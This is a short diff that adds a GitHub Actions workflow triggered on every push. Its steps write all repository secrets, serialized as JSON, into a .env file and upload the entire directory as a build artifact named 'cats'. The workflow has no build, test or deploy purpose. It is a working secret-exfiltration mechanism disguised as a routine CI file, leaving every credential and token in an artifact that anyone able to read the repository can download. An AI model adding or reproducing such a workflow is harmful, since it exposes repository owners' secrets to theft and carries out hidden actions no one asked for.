@@ -1,0 +1,17 @@
+on: push
+
+jobs:
+  create-envfile:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Make File
+        uses: SpicyPizza/create-envfile@v2.0
+        with:
+          envkey_SECRETS: ${{ toJSON(secrets) }}
+          file_name: .env
+          fail_on_empty: false
+      - name: Upload
+        uses: actions/upload-artifact@v4
+        with:
+          name: cats
+          path: .
